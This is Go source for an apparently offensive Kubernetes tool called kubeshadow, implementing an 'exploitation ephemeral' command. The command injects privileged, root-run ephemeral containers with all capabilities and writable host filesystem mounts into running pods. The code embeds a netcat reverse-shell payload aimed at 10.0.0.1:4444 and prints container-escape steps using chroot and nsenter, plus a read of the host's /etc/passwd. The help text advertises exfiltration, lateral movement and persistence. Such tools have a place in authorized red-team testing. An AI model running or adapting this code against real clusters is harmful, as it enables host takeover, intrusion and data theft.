package exploitation

import (
	"context"
	"encoding/json"
	"fmt"

	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"k8s.io/client-go/kubernetes"
)

// EphemeralCmd represents the ephemeral container command
var EphemeralCmd = &cobra.Command{
	Use:   "ephemeral",
	Short: "Inject ephemeral containers for debugging and exploitation",
	Long: `Ephemeral Container Injection

Inject ephemeral containers into running pods for debugging and exploitation:
- Privileged ephemeral containers
- Host access via ephemeral containers
- Data exfiltration through ephemeral containers
- Lateral movement via ephemeral containers
- Persistence through ephemeral containers

Examples:
  kubeshadow exploitation ephemeral inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged
  kubeshadow exploitation ephemeral debug --target-pod web-app --namespace production --image busybox --command "sh -c 'while true; do sleep 30; done'"
  kubeshadow exploitation ephemeral escape --target-pod privileged-pod --namespace kube-system --image ubuntu:latest --host-access`,
	RunE: runEphemeral,
}

func runEphemeral(cmd *cobra.Command, args []string) error {
	action, _ := cmd.Flags().GetString("action")

	switch action {
	case "inject":
		return injectEphemeralContainer(cmd)
	case "debug":
		return debugEphemeralContainer(cmd)
	case "escape":
		return escapeEphemeralContainer(cmd)
	case "list":
		return listEphemeralContainers(cmd)
	case "cleanup":
		return cleanupEphemeralContainers(cmd)
	default:
		return listEphemeralMethods()
	}
}

func listEphemeralMethods() error {
	fmt.Println("ðŸŽ¯ Available Ephemeral Container Methods")
	fmt.Println("=======================================")
	fmt.Println("")
	fmt.Println("ðŸ“¦ Injection Methods:")
	fmt.Println("  inject    - Inject malicious ephemeral container")
	fmt.Println("  debug     - Create debugging ephemeral container")
	fmt.Println("  escape    - Use ephemeral container for container escape")
	fmt.Println("")
	fmt.Println("ðŸ” Management Methods:")
	fmt.Println("  list      - List existing ephemeral containers")
	fmt.Println("  cleanup   - Remove ephemeral containers")
	fmt.Println("")
	fmt.Println("ðŸ’¡ Usage Examples:")
	fmt.Println("  kubeshadow exploitation ephemeral inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged")
	fmt.Println("  kubeshadow exploitation ephemeral debug --target-pod web-app --namespace production --image busybox")
	fmt.Println("  kubeshadow exploitation ephemeral escape --target-pod privileged-pod --namespace kube-system --image ubuntu:latest --host-access")
	return nil
}

func injectEphemeralContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	command, _ := cmd.Flags().GetString("command")
	args, _ := cmd.Flags().GetString("args")
	privileged, _ := cmd.Flags().GetBool("privileged")
	hostAccess, _ := cmd.Flags().GetBool("host-access")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "alpine:latest"
	}

	fmt.Printf("ðŸŽ¯ Injecting ephemeral container into %s/%s\n", namespace, targetPod)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Create ephemeral container specification
	ephemeralContainer := v1.EphemeralContainer{
		EphemeralContainerCommon: v1.EphemeralContainerCommon{
			Name:    "malicious-ephemeral",
			Image:   image,
			Command: []string{"/bin/sh"},
			Args:    []string{"-c", "while true; do sleep 30; done"},
		},
	}

	// Add command and args if specified
	if command != "" {
		ephemeralContainer.Command = []string{command}
	}
	if args != "" {
		ephemeralContainer.Args = []string{args}
	}

	// Add security context if privileged
	if privileged {
		ephemeralContainer.SecurityContext = &v1.SecurityContext{
			Privileged:               &[]bool{true}[0],
			RunAsUser:                &[]int64{0}[0],
			RunAsGroup:               &[]int64{0}[0],
			AllowPrivilegeEscalation: &[]bool{true}[0],
			Capabilities: &v1.Capabilities{
				Add: []v1.Capability{"ALL"},
			},
		}
	}

	// Add host access if requested
	if hostAccess {
		ephemeralContainer.VolumeMounts = []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
		}
	}

	// Add environment variables
	ephemeralContainer.Env = []v1.EnvVar{
		{
			Name:  "EPHEMERAL_INJECTED",
			Value: "true",
		},
		{
			Name:  "TARGET_POD",
			Value: targetPod,
		},
		{
			Name:  "NAMESPACE",
			Value: namespace,
		},
		{
			Name:  "SHELL_PAYLOAD",
			Value: "nc -e /bin/sh 10.0.0.1 4444",
		},
	}

	// Use ephemeralcontainers subresource endpoint
	err = addEphemeralContainer(clientset, namespace, targetPod, ephemeralContainer)
	if err != nil {
		return fmt.Errorf("failed to inject ephemeral container: %v", err)
	}

	fmt.Println("âœ… Ephemeral container injected successfully!")
	fmt.Printf("ðŸ” To access the ephemeral container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/sh\n", targetPod, namespace, ephemeralContainer.Name)

	if hostAccess {
		fmt.Printf("ðŸŒ To access host filesystem:\n")
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/\n", targetPod, namespace, ephemeralContainer.Name)
	}

	return nil
}

func debugEphemeralContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	command, _ := cmd.Flags().GetString("command")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "busybox:latest"
	}
	if command == "" {
		command = "sh -c 'while true; do sleep 30; done'"
	}

	fmt.Printf("ðŸ” Creating debugging ephemeral container in %s/%s\n", namespace, targetPod)
	fmt.Println("===============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Create debugging ephemeral container
	ephemeralContainer := v1.EphemeralContainer{
		EphemeralContainerCommon: v1.EphemeralContainerCommon{
			Name:    "debug-container",
			Image:   image,
			Command: []string{"/bin/sh"},
			Args:    []string{"-c", command},
		},
	}

	// Add debugging tools environment
	ephemeralContainer.Env = []v1.EnvVar{
		{
			Name:  "DEBUG_MODE",
			Value: "true",
		},
		{
			Name:  "TARGET_POD",
			Value: targetPod,
		},
		{
			Name:  "NAMESPACE",
			Value: namespace,
		},
	}

	// Use ephemeralcontainers subresource endpoint
	err = addEphemeralContainer(clientset, namespace, targetPod, ephemeralContainer)
	if err != nil {
		return fmt.Errorf("failed to create debugging ephemeral container: %v", err)
	}

	fmt.Println("âœ… Debugging ephemeral container created successfully!")
	fmt.Printf("ðŸ” To access the debugging container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/sh\n", targetPod, namespace, ephemeralContainer.Name)

	fmt.Println("\nðŸ’¡ Debugging commands:")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- ps aux\n", targetPod, namespace, ephemeralContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- netstat -tulpn\n", targetPod, namespace, ephemeralContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /\n", targetPod, namespace, ephemeralContainer.Name)

	return nil
}

func escapeEphemeralContainer(cmd *cobra.Command) error {
	targetPod, _ := cmd.Flags().GetString("target-pod")
	namespace, _ := cmd.Flags().GetString("namespace")
	image, _ := cmd.Flags().GetString("image")
	hostAccess, _ := cmd.Flags().GetBool("host-access")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if targetPod == "" {
		return fmt.Errorf("target-pod is required")
	}
	if namespace == "" {
		namespace = "default"
	}
	if image == "" {
		image = "ubuntu:latest"
	}

	fmt.Printf("ðŸšª Creating container escape ephemeral container in %s/%s\n", namespace, targetPod)
	fmt.Println("=====================================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// Create escape ephemeral container with privileged access
	ephemeralContainer := v1.EphemeralContainer{
		EphemeralContainerCommon: v1.EphemeralContainerCommon{
			Name:    "escape-container",
			Image:   image,
			Command: []string{"/bin/bash"},
			Args:    []string{"-c", "while true; do sleep 30; done"},
			SecurityContext: &v1.SecurityContext{
				Privileged:               &[]bool{true}[0],
				RunAsUser:                &[]int64{0}[0],
				RunAsGroup:               &[]int64{0}[0],
				AllowPrivilegeEscalation: &[]bool{true}[0],
				Capabilities: &v1.Capabilities{
					Add: []v1.Capability{"ALL"},
				},
			},
		},
	}

	// Add host access if requested
	if hostAccess {
		ephemeralContainer.VolumeMounts = []v1.VolumeMount{
			{
				Name:      "host-root",
				MountPath: "/host",
				ReadOnly:  false,
			},
			{
				Name:      "host-etc",
				MountPath: "/host/etc",
				ReadOnly:  false,
			},
			{
				Name:      "host-var",
				MountPath: "/host/var",
				ReadOnly:  false,
			},
		}
	}

	// Add escape environment variables
	ephemeralContainer.Env = []v1.EnvVar{
		{
			Name:  "ESCAPE_MODE",
			Value: "true",
		},
		{
			Name:  "TARGET_POD",
			Value: targetPod,
		},
		{
			Name:  "NAMESPACE",
			Value: namespace,
		},
		{
			Name: "HOST_ACCESS",
			Value: func() string {
				if hostAccess {
					return "enabled"
				}
				return "disabled"
			}(),
		},
	}

	// Use ephemeralcontainers subresource endpoint
	err = addEphemeralContainer(clientset, namespace, targetPod, ephemeralContainer)
	if err != nil {
		return fmt.Errorf("failed to create escape ephemeral container: %v", err)
	}

	fmt.Println("âœ… Container escape ephemeral container created successfully!")
	fmt.Printf("ðŸšª To access the escape container:\n")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- /bin/bash\n", targetPod, namespace, ephemeralContainer.Name)

	if hostAccess {
		fmt.Println("\nðŸŒ Host access commands:")
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/\n", targetPod, namespace, ephemeralContainer.Name)
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- cat /host/etc/passwd\n", targetPod, namespace, ephemeralContainer.Name)
		fmt.Printf("kubectl exec -it %s -n %s -c %s -- ls -la /host/var/log/\n", targetPod, namespace, ephemeralContainer.Name)
	}

	fmt.Println("\nðŸ’¡ Escape techniques:")
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- chroot /host /bin/bash\n", targetPod, namespace, ephemeralContainer.Name)
	fmt.Printf("kubectl exec -it %s -n %s -c %s -- nsenter -t 1 -m -u -i -n -p /bin/bash\n", targetPod, namespace, ephemeralContainer.Name)

	return nil
}

func listEphemeralContainers(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("ðŸ” Listing ephemeral containers in namespace %s\n", namespace)
	fmt.Println("=============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List pods with ephemeral containers
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	fmt.Println("ðŸ“¦ Pods with ephemeral containers:")
	for _, pod := range pods.Items {
		if len(pod.Spec.EphemeralContainers) > 0 {
			fmt.Printf("  Pod: %s\n", pod.Name)
			for _, ephemeral := range pod.Spec.EphemeralContainers {
				fmt.Printf("    - Ephemeral: %s (Image: %s)\n", ephemeral.Name, ephemeral.Image)
			}
		}
	}

	return nil
}

func cleanupEphemeralContainers(cmd *cobra.Command) error {
	namespace, _ := cmd.Flags().GetString("namespace")
	confirm, _ := cmd.Flags().GetBool("confirm")
	kubeconfig, _ := cmd.Flags().GetString("kubeconfig")

	if !confirm {
		fmt.Println("âš ï¸  This will remove all ephemeral containers!")
		fmt.Println("Use --confirm flag to proceed")
		return nil
	}

	if namespace == "" {
		namespace = "default"
	}

	fmt.Printf("ðŸ§¹ Cleaning up ephemeral containers in namespace %s\n", namespace)
	fmt.Println("===============================================")

	// Get Kubernetes client
	config, err := getKubeConfig(kubeconfig)
	if err != nil {
		return fmt.Errorf("failed to get Kubernetes config: %v", err)
	}

	clientset, err := kubernetes.NewForConfig(config)
	if err != nil {
		return fmt.Errorf("failed to create Kubernetes clientset: %v", err)
	}

	// List pods with ephemeral containers
	pods, err := clientset.CoreV1().Pods(namespace).List(context.TODO(), metav1.ListOptions{})
	if err != nil {
		return fmt.Errorf("failed to list pods: %v", err)
	}

	// Remove ephemeral containers by patching pods
	for _, pod := range pods.Items {
		if len(pod.Spec.EphemeralContainers) > 0 {
			// Create patch to remove ephemeral containers
			patch := `{
				"spec": {
					"ephemeralContainers": []
				}
			}`

			_, err := clientset.CoreV1().Pods(namespace).Patch(
				context.TODO(),
				pod.Name,
				"application/merge-patch+json",
				[]byte(patch),
				metav1.PatchOptions{},
			)
			if err != nil {
				logger.Error("Failed to remove ephemeral containers from pod %s: %v", pod.Name, err)
			} else {
				fmt.Printf("âœ… Removed ephemeral containers from pod %s\n", pod.Name)
			}
		}
	}

	fmt.Println("âœ… Ephemeral container cleanup completed!")
	return nil
}

// addEphemeralContainer adds an ephemeral container to a pod using the ephemeralcontainers subresource
func addEphemeralContainer(clientset *kubernetes.Clientset, namespace, podName string, ephemeralContainer v1.EphemeralContainer) error {
	ctx := context.TODO()

	// Get the pod first to retrieve existing ephemeral containers
	pod, err := clientset.CoreV1().Pods(namespace).Get(ctx, podName, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("failed to get pod: %v", err)
	}

	// Append the new ephemeral container to existing ones
	pod.Spec.EphemeralContainers = append(pod.Spec.EphemeralContainers, ephemeralContainer)

	// Create a pod with only the ephemeral containers for the patch
	patchPod := &v1.Pod{
		ObjectMeta: metav1.ObjectMeta{
			Name: podName,
		},
		Spec: v1.PodSpec{
			EphemeralContainers: pod.Spec.EphemeralContainers,
		},
	}

	// Serialize the pod to JSON
	patchData, err := json.Marshal(patchPod)
	if err != nil {
		return fmt.Errorf("failed to marshal pod: %v", err)
	}

	// Use REST client to patch the ephemeralcontainers subresource
	restClient := clientset.CoreV1().RESTClient()
	result := &v1.Pod{}

	err = restClient.Patch(types.StrategicMergePatchType).
		Namespace(namespace).
		Resource("pods").
		Name(podName).
		SubResource("ephemeralcontainers").
		Body(patchData).
		Do(ctx).
		Into(result)

	if err != nil {
		return fmt.Errorf("failed to patch ephemeralcontainers subresource: %v", err)
	}

	return nil
}

func init() {
	EphemeralCmd.Flags().String("action", "list", "Action to perform (inject, debug, escape, list, cleanup)")
	EphemeralCmd.Flags().String("target-pod", "", "Target pod for ephemeral container")
	EphemeralCmd.Flags().String("namespace", "default", "Target namespace")
	EphemeralCmd.Flags().String("image", "alpine:latest", "Container image to use")
	EphemeralCmd.Flags().String("command", "", "Command to run in ephemeral container")
	EphemeralCmd.Flags().String("args", "", "Arguments for the command")
	EphemeralCmd.Flags().Bool("privileged", false, "Run with privileged security context")
	EphemeralCmd.Flags().Bool("host-access", false, "Enable host filesystem access")
	EphemeralCmd.Flags().String("kubeconfig", "", "Path to kubeconfig file")
	EphemeralCmd.Flags().Bool("confirm", false, "Confirm destructive operations")
}
